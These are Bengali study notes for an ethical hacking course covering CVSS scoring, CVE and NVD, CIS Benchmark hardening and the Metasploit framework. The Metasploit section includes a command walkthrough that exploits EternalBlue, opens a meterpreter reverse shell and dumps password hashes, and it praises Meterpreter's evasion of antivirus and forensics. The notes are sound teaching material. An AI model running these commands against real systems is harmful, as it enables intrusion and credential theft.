3. **প্যাচ ম্যানেজমেন্টে সহায়তা:** কোন দুর্বলতাগুলো বর্তমানে ডার্ক ওয়েবে বা হ্যাকার কমিউনিটিতে অ্যাক্টিভলি এক্সপ্লয়েট হচ্ছে তা জেনে দ্রুততম সময়ে প্যাচিংয়ের সিদ্ধান্ত নেওয়া।
4. **নতুন আক্রমণ কৌশল (TTP) শেখা:** হ্যাকারদের পরিবর্তিত কৌশল ও টেকনিক বুঝে প্রতিষ্ঠানের ফায়ারওয়াল ও IDS সিগনেচার আপডেট করা।

## 🎯 পরীক্ষার জন্য বিশেষ পরামর্শ (Exam Tips)

1. **লাইফ সাইকেলের ক্রম:** ৫টি পর্যায় (Creation ➔ Discovery ➔ Disclosure ➔ Patch Dev ➔ Deployment & Exploitation) সুন্দর ডায়াগ্রাম বা বুলেট পয়েন্টে লিখবেন।
2. **0-Day বনাম 1-Day তুলনা:** এই অংশটি শিক্ষকরা খুবই পছন্দ করেন; টেবিল আকারে লিখলে পুরো মার্কস পাওয়া যাবে।

# 29. What is the CVSS Scoring System? (Common Vulnerability Scoring System)

> **কোর্স:** Ethical Hacking (ECH)  
> **মডিউল:** Module 07 — Vulnerability Assessment & Management  
> **পরীক্ষার গুরুত্ব:** ★★★ (3 Stars — আধুনিক সাইবার সিকিউরিটিতে দুর্বলতার ঝুঁকি পরিমাপের স্ট্যান্ডার্ড কাঠামো)

---

## 📌 সংক্ষেপে মূল ধারণা (At a Glance)

**CVSS (Common Vulnerability Scoring System)** হলো একটি আন্তর্জাতিক, উন্মুক্ত এবং ভেন্ডর-নিরপেক্ষ স্ট্যান্ডার্ড কাঠামো, যার মাধ্যমে কোনো সফটওয়্যার বা সিস্টেমের নিরাপত্তা দুর্বলতার **তীব্রতা (Severity)** ও **ঝুঁকির মাত্রা (Risk Impact)** ০.০ থেকে ১০.০ স্কেলের একটি সংখ্যামানে প্রকাশ করা হয়।

এটি আন্তর্জাতিক সংস্থা **FIRST.org** (Forum of Incident Response and Security Teams) দ্বারা পরিচালিত ও রক্ষণাবেক্ষণ করা হয়।

```
        ┌─────────────────────────────────────────────────────────────┐
        │             CVSS Severity Rating Scale (0.0 - 10.0)         │
        ├─────────────┬───────────────────────────────────────────────┤
        │ 0.0         │ None (কোনো প্রত্যক্ষ ঝুঁকি নেই)               │
        │ 0.1 - 3.9   │ Low (নিম্ন ঝুঁকি — সীমিত ক্ষতি)               │
        │ 4.0 - 6.9   │ Medium (মাঝারি ঝুঁকি — নির্দিষ্ট শর্তাধীন)     │
        │ 7.0 - 8.9   │ High (উচ্চ ঝুঁকি — সিস্টেমে বড় ধরনের প্রভাব)  │
        │ 9.0 - 10.0  │ Critical (মারাত্মক ঝুঁকি — রিমোট কোড এক্সিকিউশন)│
        └─────────────┴───────────────────────────────────────────────┘
```

## 🎯 কেন CVSS Scoring System অপরিহার্য? (Purpose & Benefits)

1. **সার্বজনীন মানদণ্ড (Standardized Language):** বিশ্বের সকল সিকিউরিটি ভেন্ডর (Microsoft, Cisco, RedHat) এবং স্ক্যানার (Nessus, Qualys) দুর্বলতার ঝুঁকি বর্ণনায় একই ভাষা ব্যবহার করতে পারে।
2. **প্যাচিংয়ের অগ্রাধিকার নির্ধারণ (Prioritization):** কোনো সিস্টেমে ৫০০টি বাগ থাকলে অ্যাডমিন বুঝতে পারেন কোনগুলো `Critical (9.0 - 10.0)` এবং কোনগুলো আগে সমাধান করতে হবে।
3. **আইন ও কমপ্লায়েন্স নিশ্চিতকরণ:** PCI-DSS বা ISO 27001 কমপ্লায়েন্সে ৪.০ বা তার বেশি স্কোরের যেকোনো দুর্বলতা নির্দিষ্ট দিনের মধ্যে ফিক্স করার বাধ্যবাধকতা রয়েছে।

## 🏗️ CVSS মেট্রিক গ্রুপসমূহ (CVSS Metric Groups)

### ১. Base Metric Group (মৌলিক মেট্রিক গ্রুপ)
এটি একটি দুর্বলতার অন্তর্নিহিত এবং অপরিবর্তনীয় বৈশিষ্ট্যগুলোকে নির্দেশ করে, যা সময়ের সাথে বা ব্যবহারকারীর পরিবেশের কারণে পরিবর্তিত হয় না। এটি আবার ৩টি সাব-ক্যাটাগরিতে বিভক্ত:

#### ক) Exploitability Metrics (দুর্বলতা কাজে লাগানোর সহজতা):
* **Attack Vector (AV):** আক্রমণকারী কোথা থেকে আক্রমণ করতে পারে?
  * *Network (N):* দূরবর্তী ইন্টারনেট থেকে (সবচেয়ে বিপজ্জনক)।
  * *Adjacent (A):* একই লোকাল নেটওয়ার্ক বা সাবনেট থেকে।
  * *Local (L):* টার্গেট মেশিনে সরাসরি বা এসএসএইচ দিয়ে প্রবেশ করে।
  * *Physical (P):* কম্পিউটারে সশরীরে হাত দিয়ে (ইউএসবি ড্রাইভ ঢুকিয়ে)।
* **Attack Complexity (AC):** আক্রমণ সফল করতে কতটা প্রযুক্তিগত জটিলতা দরকার? (`Low (L)` অথবা `High (H)`)।
* **Privileges Required (PR):** আক্রমণের পূর্বে কোনো ইউজার অ্যাকাউন্টের অধিকার দরকার কি না? (`None (N)`, `Low (L)`, `High (H)`)।
* **User Interaction (UI):** ভিকটিমকে কোনো লিংকে ক্লিক বা ফাইল ওপেন করতে হয় কি না? (`None (N)` অথবা `Required (R)`)।

#### খ) Scope (S) (প্রভাবের পরিধি):
দুর্বলতা কাজে লাগিয়ে আক্রমণকারী কি মূল সফটওয়্যারের গণ্ডি পেরিয়ে অন্য কম্পোনেন্টে (যেমন: ভার্চুয়াল মেশিন থেকে হাইপারভাইজর বা ক্লাউড হোস্টে) ক্ষতি করতে পারে?
* **Unchanged (U):** প্রভাব কেবল আক্রান্ত সফটওয়্যারেই সীমাবদ্ধ।
* **Changed (C):** এক সফটওয়্যার থেকে বেরিয়ে অন্য সিস্টেমে ছড়িয়ে পড়ে (যেমন: XSS বা VM Escape)।

#### গ) Impact Metrics (সিআইএ ক্ষতি পরিমাপ):
* **Confidentiality Impact (C):** গোপনীয় তথ্যের ফাঁস কতটুকু? (`High (H)`, `Low (L)`, `None (N)`).
* **Integrity Impact (I):** ডেটা অননুমোদিতভাবে পরিবর্তন বা মোছার ঝুঁকি? (`High (H)`, `Low (L)`, `None (N)`).
* **Availability Impact (A):** সিস্টেম অচল বা ডাউন হয়ে যাওয়ার ঝুঁকি (DoS)? (`High (H)`, `Low (L)`, `None (N)`).

---

### ২. Threat Metric Group (হুমকি মেট্রিক গ্রুপ — পূর্বে Temporal Metric)
এই মেট্রিকগুলো সময়ের আবর্তনে পরিবর্তিত হয়:
* **Exploit Code Maturity (E):** ইন্টারনেটে কি কোনো কার্যকরী হ্যাকিং কোড (PoC বা Metasploit মডিউল) পাওয়া যাচ্ছে?
* **Remediation Level (RL):** ভেন্ডর কি অফিসিয়াল প্যাচ দিয়েছে (`Official Fix`), কোনো ওয়ার্কঅ্যারাউন্ড দিয়েছে, নাকি কোনো সমাধানই নেই (`Unavailable`)?
* **Report Confidence (RC):** দুর্বলতার অস্তিত্ব কতটা নিশ্চিতভাবে প্রমাণিত? (`Confirmed`, `Reasonable`, `Unknown`)।

---

### ৩. Environmental Metric Group (পরিবেশগত মেট্রিক গ্রুপ)
প্রতিটি প্রতিষ্ঠানের নিজস্ব অবকাঠামো ভিন্ন ভিন্ন হয়। কোনো প্রতিষ্ঠানে একটি ডেটাবেস ইন্টারনেট থেকে বিচ্ছিন্ন এয়ার-গ্যাপড ল্যানে থাকতে পারে, আবার অন্য প্রতিষ্ঠানে ক্লাউডে ওপেন থাকতে পারে।
* **Modified Base Metrics:** নিজস্ব ফায়ারওয়াল বা সুরক্ষার কারণে বেস মেট্রিকগুলোর মান কমানো বা বাড়ানো।
* **Confidentiality, Integrity, Availability Requirements (CR, IR, AR):** ঐ প্রতিষ্ঠানের জন্য উক্ত সার্ভারটির সিআইএ ট্রায়াডের গুরুত্ব কতটুকু (Low, Medium, High)।

## 🏷️ ১. CVE (Common Vulnerabilities and Exposures) কী?

### সংজ্ঞা (Definition)
**CVE** হলো জনসমক্ষে প্রকাশিত সাইবার নিরাপত্তা দুর্বলতা ও এক্সপোজারগুলোর একটি সার্বজনীন, বিনামূল্যে ব্যবহারযোগ্য এবং প্রমিত শব্দকোষ (Dictionary)। এটি মার্কিন অলাভজনক প্রতিষ্ঠান **MITRE Corporation** দ্বারা পরিচালিত এবং US CISA/DHS দ্বারা অর্থায়িত।

### CVE আইডির গঠন বিন্যাস (Syntax & Anatomy):
প্রতিটি CVE-র একটি নির্দিষ্ট ফরম্যাট থাকে:
$$\mathbf{CVE - YYYY - NNNN...}$$
* **CVE:** প্রিফিক্স (Prefix)।
* **YYYY:** যে বছর দুর্বলতাটি আনুষ্ঠানিকভাবে নথিবদ্ধ বা প্রকাশিত হয়েছে (Year of publication)।
* **NNNN...:** উক্ত বছরের একটি নির্দিষ্ট ক্রমিক নম্বর (৪ থেকে ৭ ডিজিট বিশিষ্ট)।

> 📌 **বিখ্যাত উদাহরণ:**
> * `CVE-2017-0144` ➔ **EternalBlue** (উইন্ডোজ SMBv1 রিমোট কোড এক্সিকিউশন বাগ, যা WannaCry র‍্যানসমওয়্যারে ব্যবহৃত হয়েছিল)।
> * `CVE-2021-44228` ➔ **Log4Shell** (Apache Log4j লাইব্রেরির মারাত্মক RCE ত্রুটি)।

### CNA (CVE Numbering Authorities):
যেসব অনুমোদিত প্রতিষ্ঠান বা ভেন্ডর সরাসরি নতুন CVE আইডি ইস্যু করতে পারে তাদের **CNA** বলা হয় (যেমন: Microsoft, Google, Apple, Red Hat)।

## 🗄️ ২. NVD (National Vulnerability Database) কী?

### সংজ্ঞা (Definition)
**NVD** হলো মার্কিন সরকারের **NIST (National Institute of Standards and Technology)** কর্তৃক পরিচালিত বিশ্বের সর্ববৃহৎ মানসম্মত ভালনারেবিলিটি ম্যানেজমেন্ট রিপোজিটরি।

### MITRE CVE বনাম NIST NVD-এর পার্থক্য:

| বৈশিষ্ট্য | MITRE CVE | NIST NVD |
|---|---|---|
| **মূল ভূমিকা** | ডিকশনারি বা ক্যাটালগ (কেবল আইডি ও সংক্ষিপ্ত বিবরণ দেয়)। | বিশ্লেষণধর্মী ডাটাবেস (পূর্ণাঙ্গ ঝুঁকি ও সমাধান বিশ্লেষণ করে)। |
| **CVSS স্কোরিং** | সাধারণত সিভিএসএস স্কোর গণনা করে না। | অফিসিয়াল **CVSS Base & Temporal Score** হিসাব করে প্রকাশ করে। |
| **সম্পর্কিত তথ্য** | সাধারণ রেফারেন্স লিংক। | **CWE** (দুর্বলতার ধরন), **CPE** (আক্রান্ত হার্ডওয়্যার/সফটওয়্যার তালিকা) যুক্ত করে। |
| **অফিসিয়াল ওয়েবসাইট** | `cve.mitre.org` বা `cve.org` | `nvd.nist.gov/vuln` |

## 🧮 ৩. CVSS ভেক্টর স্ট্রিং বিশ্লেষণ ও স্কোর গণনা (Vector String Analysis)

NVD ডাটাবেসে প্রতিটি দুর্বলতার পেছনে একটি **CVSS Vector String** থাকে, যা মূলত বিভিন্ন মেট্রিকের সংক্ষিপ্ত কোড।

### বাস্তব উদাহরণ: Log4Shell (`CVE-2021-44228`)
* **CVSS v3.1 ভেক্টর স্ট্রিং:**
  ```text
  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  ```
* **চূড়ান্ত বেস স্কোর:** **10.0 (Critical)**

#### 🔬 ভেক্টর স্ট্রিংটির ডিকোড বা ব্যাখ্যা:

```
┌───────────────┬───────────────────────────────┬─────────────────────────────────┐
│ মেট্রিক কোড   │ পূর্ণরূপ                       │ এই দুর্বলতায় এর বাস্তব অর্থ    │
├───────────────┼───────────────────────────────┼─────────────────────────────────┤
│ CVSS:3.1      │ CVSS Version 3.1              │ ব্যবহৃত স্ট্যান্ডার্ড ভার্সন   │
│ AV:N          │ Attack Vector: Network        │ ইন্টারনেট দিয়ে দূর থেকে আক্রমণ সম্ভব│
│ AC:L          │ Attack Complexity: Low        │ আক্রমণ করা অত্যন্ত সহজ          │
│ PR:N          │ Privileges Required: None     │ কোনো লগইন বা পাসওয়ার্ড লাগে না │
│ UI:N          │ User Interaction: None        │ ভিকটিমের কোনো ক্লিকের প্রয়োজন নেই│
│ S:C           │ Scope: Changed                │ আক্রান্ত অ্যাপ ছাড়িয়ে সার্ভার দখল│
│ C:H           │ Confidentiality: High         │ সব গোপন তথ্য চুরি করা সম্ভব     │
│ I:H           │ Integrity: High               │ সব ডেটা পরিবর্তন বা মোছা সম্ভব │
│ A:H           │ Availability: High            │ সার্ভার সম্পূর্ণ ক্র্যাশ করানো যায় │
└───────────────┴───────────────────────────────┴─────────────────────────────────┘
```

## 🛠️ ৪. CVE NVD ও FIRST ক্যালকুলেটরে স্কোর গণনার হ্যান্ডস-অন ধাপ (Step-by-Step Guide)

পরীক্ষার ল্যাব অ্যাসাইনমেন্ট বা বাস্তবিক মূল্যায়নে যেভাবে CVSS ক্যালকুলেশন সম্পন্ন করা হয়:

### ধাপ ১: অফিসিয়াল ক্যালকুলেটর ওপেন করা
* ব্রাউজারে প্রবেশ করুন: [www.first.org/cvss/calculator/v3-1](https://www.first.org/cvss/calculator/v3-1) অথবা NVD-এর CVSS ক্যালকুলেটরে।

### ধাপ ২: Exploitability মেট্রিকস নির্বাচন করা
1. **Attack Vector (AV):** আক্রমণ ইন্টারনেট দিয়ে হলে `Network` নির্বাচন করুন।
2. **Attack Complexity (AC):** কোনো জটিল শর্ত না থাকলে `Low` দিন।
3. **Privileges Required (PR):** কোনো ক্রেডেনশিয়াল ছাড়াই সম্ভব হলে `None` দিন।
4. **User Interaction (UI):** ভিকটিমের কোনো হস্তক্ষেপ না লাগলে `None` দিন।

### ধাপ ৩: Scope ও Impact মেট্রিকস নির্বাচন করা
1. **Scope (S):** প্রভাব অন্য কোনো কম্পোনেন্টে পৌঁছালে `Changed`, অন্যথায় `Unchanged` দিন।
2. **Confidentiality (C):** সিস্টেমের ডেটা পুরোপুরি ফাঁস হলে `High` দিন।
3. **Integrity (I):** ডেটা অননুমোদিতভাবে পরিবর্তন সম্ভব হলে `High` দিন।
4. **Availability (A):** সার্ভার অফলাইনে চলে যাওয়ার ঝুঁকি থাকলে `High` দিন।

### ধাপ ৪: আউটপুট ও স্কোর পর্যবেক্ষণ
* ক্যালকুলেটরের উপরে স্বয়ংক্রিয়ভাবে গাণিতিক ফর্মুলার মাধ্যমে বেস স্কোর প্রদর্শিত হবে (যেমন: **9.8** বা **10.0 Critical**)।
* সাথে সাথে একটি প্রমিত ভেক্টর স্ট্রিং তৈরি হবে যা রিপোর্টিংয়ের জন্য কপি করে নেওয়া যায়।

1. **CVE আইডি সিনট্যাক্স:** `CVE-YYYY-NNNN` ফরম্যাটটি স্পষ্টভাবে লিখবেন।
2. **CVE বনাম NVD পার্থক্য:** MITRE কেবল নামকরণ করে, আর NIST NVD তাকে বিশ্লেষণ করে স্কোর দেয়—এই মৌলিক পার্থক্যটি লিখলে পরীক্ষক খুশি হন।
3. **ভেক্টর স্ট্রিং ডিকোড:** উত্তরে `AV:N/AC:L/PR:N/UI:N...` লিখে তার অর্থ টেবিল আকারে বুঝিয়ে দিলে ফুল মার্কস পাওয়া যাবে।

## 📌 সংক্ষেপে মূল ধারণা (At a Glance)

**CIS Benchmark** হলো সিস্টেম ও নেটওয়ার্ক ডিভাইসকে সাইবার আক্রমণ থেকে সুরক্ষিত রাখার জন্য বিশ্বব্যাপী স্বীকৃত, ঐকমত্যভিত্তিক (Consensus-based) সেরা কনফিগারেশন নির্দেশিকা বা **সিস্টেম হার্ডেনিং (System Hardening)** গাইডলাইন।

এটি অলাভজনক আন্তর্জাতিক প্রতিষ্ঠান **Center for Internet Security (CIS)** দ্বারা তৈরি ও পরিচালিত। যেকোনো নতুন ওএস বা সফটওয়্যার ডিফল্ট অবস্থায় অনেক নিরাপত্তাহীন ফিচার চালু রাখে; CIS Benchmark অনুসরণ করে সেই ফাঁকফোকরগুলো বন্ধ করা হয়।

```
[ Default System (অরক্ষিত) ] 
            │
            ├── অপ্রয়োজনীয় সার্ভিস চালু (Telnet, SMBv1)
            ├── কোনো লকআউট পলিসি নেই (Brute-force ঝুঁকি)
            └── ডিফল্ট পাসওয়ার্ড ও উইক এনক্রিপশন
            │
            ▼  [ CIS Benchmark Hardening প্রয়োগ ]
            │
[ Hardened Secure System ] 
            ├── ৫ বার ভুল দিলে অ্যাকাউন্ট লক (Account Lockout Policy)
            ├── কেবল SSHv2 চালু, রিমোট টেলনেট নিষ্ক্রিয়
            └── শক্তিশালী পাসওয়ার্ড পলিসি ও সেন্ট্রালাইজড লগিং
```

## 🏢 ১. CIS (Center for Internet Security) কী?

**CIS** হলো একটি আন্তর্জাতিক সাইবার নিরাপত্তা সংস্থা, যা সরকার, অ্যাকাডেমিয়া এবং শীর্ষস্থানীয় নিরাপত্তা বিশেষজ্ঞদের সমন্বয়ে প্রতিষ্ঠিত। এর মূল লক্ষ্য হলো বাস্তবসম্মত ও প্রয়োগযোগ্য নিরাপত্তা কাঠামোর মাধ্যমে ডিজিটাল পরিকাঠামো সুরক্ষিত করা।

### CIS-এর দুটি প্রধান অবদান:
1. **CIS Controls (পূর্বে SANS Top 20):** প্রাতিষ্ঠানিক সাইবার সুরক্ষার জন্য ১৮টি অগ্রাধিকারভিত্তিক সার্বিক পদক্ষেপ (যেমন: Data Protection, Access Control Management)।
2. **CIS Benchmarks:** নির্দিষ্ট অপারেটিং সিস্টেম, ডাটাবেস, ক্লাউড ও নেটওয়ার্ক ডিভাইসের জন্য সুনির্দিষ্ট ও টেকনিক্যাল কনফিগারেশন চেকলিস্ট (২৫+ ভেন্ডর গ্রুপের জন্য ১০০টিরও বেশি গাইডলাইন)।

CIS প্রতিটি প্রযুক্তির জন্য দুটি ভিন্ন স্তরের সিকিউরিটি প্রোফাইল প্রদান করে:

```
├───────────────────┬────────────────────────────────────────────────────┤
│ Level 1 Profile   │ • অপরিহার্য নিরাপত্তা (Essential Hardening)        │
│ (বেসিক প্রোফাইল)  │ • সিস্টেমের স্বাভাবিক কার্যকারিতা ব্যাহত করে না   │
│                   │ • সব ধরনের সাধারণ কর্পোরেট পরিবেশে প্রয়োগযোগ্য     │

```

## ⚙️ ৩. বাস্তব হার্ডেনিং উদাহরণ (Practical Hardening Examples)

পরীক্ষার ল্যাব অ্যাসাইনমেন্ট এবং থিওরি পরীক্ষায় CIS বেঞ্চমার্ক বাস্তবায়নের দুটি প্রধান ক্ষেত্র লিখতে হয়:

---

### ক) উইন্ডোজ অপারেটিং সিস্টেম হার্ডেনিং (Windows OS Hardening)
উইন্ডোজে লোকাল সিকিউরিটি পলিসি (`secpol.msc`) ব্যবহার করে CIS গাইডলাইন বাস্তবায়ন:

1. **Account Lockout Policy (অ্যাকাউন্ট লকআউট পলিসি):**
   * ব্রুট-ফোর্স ও পাসওয়ার্ড স্প্রেয়িং আক্রমণ প্রতিরোধে কনফিগারেশন:
     * **Account lockout threshold:** **৫ বার ভুল পাসওয়ার্ড দিলে লক** (*5 invalid logon attempts*)।
     * **Account lockout duration:** ১৫ থেকে ৩০ মিনিট।
     * **Reset account lockout counter after:** ১৫ থেকে ৩০ মিনিট।

2. **পাসওয়ার্ড জটিলতা ও মেয়াদ (Password Policy):**
   * ন্যূনতম দৈর্ঘ্য: কমপক্ষে ১৪ ক্যারেক্টার (`Minimum password length = 14`).
   * জটিলতা বাধ্যবাধকতা: বড় হাতের অক্ষর, ছোট হাতের অক্ষর, সংখ্যা ও স্পেশাল ক্যারেক্টার বাধ্যতামূলক (`Password must meet complexity requirements = Enabled`).
   * পাসওয়ার্ড হিস্ট্রি: পূর্ববর্তী ২৪টি পাসওয়ার্ড পুনরায় ব্যবহার নিষিদ্ধ করা।

3. **ঝুঁকিপূর্ণ ও অপ্রয়োজনীয় সার্ভিস বন্ধ করা:**
   * **SMBv1 ডিজাবল করা:** EternalBlue র‍্যানসমওয়্যার সংক্রমণ ঠেকাতে।
   * **NetBIOS over TCP/IP ও LLMNR বন্ধ করা:** নেটওয়ার্কে ক্রেডেনশিয়াল স্পুফিং (Responder attack) বন্ধ করতে।
   * **Guest Account ডিজেবল রাখা।**

---

সিসকো নেটওয়ার্ক ডিভাইসে CIS বেঞ্চমার্ক নির্দেশিকা অনুযায়ী কনফিগারেশন:

```cisco

Router(config)# enable secret MySecureAdminPass#2026

! ২. অনিরাপদ HTTP বন্ধ করে কেবল নিরাপদ প্রোটোকল রাখা
```

## 📌 সংক্ষেপে মূল ধারণা (At a Glance)

**Metasploit Framework (MSF)** হলো বিশ্বের সবচেয়ে জনপ্রিয় ও শক্তিশালী ওপেন-সোর্স পেনিট্রেশন টেস্টিং ও এক্সপ্লয়েটেশন প্ল্যাটফর্ম। এটি ২০০৩ সালে এইচ. ডি. মুর (H. D. Moore) তৈরি করেন এবং বর্তমানে সাইবার সিকিউরিটি প্রতিষ্ঠান **Rapid7** দ্বারা পরিচালিত ও রক্ষণাবেক্ষণ করা হয়।

মেটাসপ্লয়েটের মূল শক্তি হলো এটি কোনো বিচ্ছিন্ন স্ক্রিপ্ট নয়—বরং এটি স্ক্যানিং, দুর্বলতা যাচাই, এক্সপ্লয়েট চালানো, পেলোড ডেলিভারি এবং সিস্টেম দখলের পরবর্তী কাজগুলোকে (Post-Exploitation) একটি একক ফ্রেমওয়ার্কের আওতায় নিয়ে আসে।

```
[ Attacker Machine ]                                      [ Target Server ]
        │                                                         │
```

## 🏗️ মেটাসপ্লয়েটের প্রধান আর্কিটেকচারাল কম্পোনেন্ট

1. **`msfconsole`:** মেটাসপ্লয়েটের মূল ইন্টারেক্টিভ কমান্ড-লাইন ইন্টারফেস (CLI), যেখান থেকে সকল মডিউল পরিচালনা করা হয়।
2. **`msfvenom`:** একটি শক্তিশালী স্বতন্ত্র কমান্ড-লাইন টুল, যা কাস্টম পেলোড, শেলকোড তৈরি এবং এনকোড (Obfuscation) করতে ব্যবহৃত হয়।
3. **`Meterpreter`:** মেটাসপ্লয়েটের সবচেয়ে আধুনিক স্টেজ পেলোড, যা মেমরিতে (In-Memory DLL Injection) সরাসরি রান করে এবং ডিস্কে কোনো ফাইল সেভ না করে পূর্ণাঙ্গ সিস্টেম নিয়ন্ত্রণ দেয়।

### ১. Exploits (`exploit/`)
* **সংজ্ঞা:** যে কোড বা স্ক্রিপ্ট কোনো নির্দিষ্ট সফটওয়্যার বা অপারেটিং সিস্টেমের নিরাপত্তা দুর্বলতাকে (Vulnerability) কাজে লাগিয়ে টার্গেটে অননুমোদিত প্রবেশাধিকার নিশ্চিত করে।
* **বাস্তব উদাহরণ:**
  * `exploit/windows/smb/ms17_010_eternalblue` (উইন্ডোজ SMB বাগে আক্রমণ)
  * `exploit/multi/http/log4shell_header_injection` (Log4j বাগ)

---

### ২. Payloads (`payload/`)
* **সংজ্ঞা:** এক্সপ্লয়েট সফল হওয়ার পর টার্গেট মেশিনে আক্রমণকারী যে কোডটি রান করাতে চান (যেমন: কমান্ড প্রম্পট পাওয়া, ইউজার তৈরি করা, মিটারপ্রিটার শেল নেওয়া)।
* **পেলোডের ৩টি সাব-ক্যাটাগরি:**
  1. **Singles (Inline):** একক ও স্বয়ংসম্পূর্ণ পেলোড যা একবারে কাজ শেষ করে (যেমন: একটি লোকাল অ্যাডমিন ইউজার তৈরি করা)।
  2. **Stagers:** একটি অত্যন্ত ছোট কোড যা টার্গেটে ঢুকে আক্রমণকারীর সাথে নির্ভরযোগ্য নেটওয়ার্ক সংযোগ তৈরি করে এবং বড় মূল পেলোডটিকে মেমরিতে ডাউনলোড করে আনে।
  3. **Stages:** স্টেজার দ্বারা মেমরিতে ডাউনলোডকৃত পূর্ণাঙ্গ পেলোড (যেমন: `meterpreter/reverse_tcp`)।

---

### ৩. Auxiliary (`auxiliary/`)
* **সংজ্ঞা:** যেসকল মডিউল কোনো আক্রমণ বা শেল প্রদান করে না, বরং নেটওয়ার্ক স্ক্যানিং, সার্ভিস ভার্সন সনাক্তকরণ, স্নিফিং, ফুজিং (Fuzzing) এবং পাসওয়ার্ড অনুমানের মতো সহযোগী কাজ করে।
* **বাস্তব উদাহরণ:**
  * `auxiliary/scanner/portscan/tcp` (পোর্ট স্ক্যানার)
  * `auxiliary/scanner/smb/smb_version` (এসএমবি ভার্সন ডিটেকশন)
  * `auxiliary/scanner/smb/smb_enumshares` (শেয়ার ফোল্ডার খোঁজা)

---

### ৪. Post (`post/`)
* **সংজ্ঞা:** সিস্টেমে প্রাথমিক এক্সেস পাওয়ার পর পরবর্তী ধাপের কাজগুলো (Post-Exploitation) করার জন্য ব্যবহৃত মডিউল।
* **কাজসমূহ:** প্রিভিলেজ এসকেলেশন (রুট/অ্যাডমিন হওয়া), মেমোরি থেকে হ্যাশ ও পাসওয়ার্ড ডাম্প করা, অভ্যন্তরীণ নেটওয়ার্কে পিভটিং (Pivoting) করা।
* **বাস্তব উদাহরণ:**
  * `post/windows/gather/smart_hashdump` (পাসওয়ার্ড হ্যাশ ডাম্প)
  * `post/windows/escalate/getsystem` (সিস্টেম প্রিভিলেজ নেওয়া)

---

### ৫. Encoders (`encoder/`)
* **সংজ্ঞা:** পেলোড বা শেলকোডের মধ্যকার অনিরাপদ ক্যারেক্টার (Bad Characters যেমন: `\x00` Null Byte) মুছে ফেলা এবং ট্র্যাডিশনাল সিগনেচার-ভিত্তিক অ্যান্টিভাইরাস ফাঁকি দেওয়ার জন্য কোডকে অবফাসকেট (Obfuscate) করার মডিউল।
* **বাস্তব উদাহরণ:** `encoder/x86/shikata_ga_nai` (পলিমরফিক এক্সওআর অ্যাডিটিভ ফিডব্যাক এনকোডার)।

---

### ৬. NOP Generators (`nop/`)
* **সংজ্ঞা:** বাফার ওভারফ্লো আক্রমণে এক্সপ্লোয়েটের স্থিতিশীলতা বজায় রাখার জন্য নো-অপারেশন স্লেড (NOP Sled — যেমন: x86 আর্কিটেকচারে `0x90`) তৈরি করে। এর ফলে সিপিইউ নির্বিঘ্নে মূল শেলকোডে স্লাইড করে প্রবেশ করতে পারে।

## 💡 কেন Metasploit ব্যবহার করবেন? (Why Use Metasploit?)

একজন এথিক্যাল হ্যাকার বা পেনিট্রেশন টেস্টারের জন্য মেটাসপ্লয়েটের কৌশলগত সুবিধাসমূহ:

1. **অবিচ্ছিন্ন প্ল্যাটফর্ম (Unified Ecosystem):** তথ্য সংগ্রহ থেকে শুরু করে এক্সপ্লয়েট ও রিপোর্ট—সব একই টুলে সম্ভব।
2. **নির্ভরযোগ্য ও যাচাইকৃত এক্সপ্লয়েট (Verified Reliability):** ইন্টারনেটের অনির্ভরযোগ্য হ্যাকিং স্ক্রিপ্ট রান করলে প্রোডাকশন সার্ভার ক্র্যাশ করতে পারে; মেটাসপ্লয়েটের মডিউলগুলো বৈজ্ঞানিকভাবে পরীক্ষিত ও নিরাপদ।
3. **মিটারপ্রিটারের স্টিলথ প্রযুক্তি (In-Memory Stealth):** কোনো ফাইল ভিকটিমের হার্ডডিস্কে সেভ না হওয়ায় সাধারণ অ্যান্টিভাইরাস একে ধরতে পারে না এবং ফরেনসিক তদন্তে প্রমাণ কম থাকে।
4. **নেটওয়ার্ক পিভটিং (Pivoting Support):** একটি অভ্যন্তরীণ মেশিন হ্যাক করে মেটাসপ্লয়েটের নিজস্ব রাউটিংয়ের মাধ্যমে কোম্পানির পেছনের সংরক্ষিত ফায়ারওয়াল পার হয়ে ভেতরের মেশিনে আক্রমণ চালানো যায়।
5. **সময় ও শ্রম সাশ্রয়ী:** অটোমেটেড হ্যান্ডলিংয়ের ফলে জটিল কোডিং ছাড়া দ্রুত সিকিউরিটি অডিট শেষ করা যায়।

## ⌨️ মেটাসপ্লয়েট ব্যবহারের মৌলিক ওয়ার্কফ্লো (Hands-on Syntax)

```bash
# ১. মেটাসপ্লয়েট কনসোল চালু করা
msfconsole -q

# ২. মডিউল খোঁজা ও নির্বাচন করা
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue

show options

set RPORT 445

# ৪. পেলোড কনফিগারেশন
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.2

# ৫. এক্সপ্লয়েট রান করা
exploit

# ৬. মিটারপ্রিটার সেশনে সিস্টেম ইনফো ও প্রিভিলেজ দেখা
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
```

## 🎯 পরীক্ষার জন্য বিশেষ পরামর্শ (Exam Tips)

1. **৬টি মডিউলের নাম ও কাজ:** Exploit, Payload, Auxiliary, Post, Encoder, NOP—এই ৬টি নাম সুস্পষ্ট হেডিং দিয়ে লিখবেন।
2. **পেলোডের ৩টি ভাগ:** Single, Stager এবং Stage—এই তিনটি সাব-ক্যাটাগরি উল্লেখ করলে উত্তরের গভীরতা অনেক বেড়ে যায়।
3. **Meterpreter কেন অনন্য:** মেমরিতে চলে, ডিস্কে কোনো ফাইল সেভ করে না—এই পয়েন্টটি মেটাসপ্লয়েটের গুরুত্বের প্রধান কারণ হিসেবে তুলে ধরবেন।
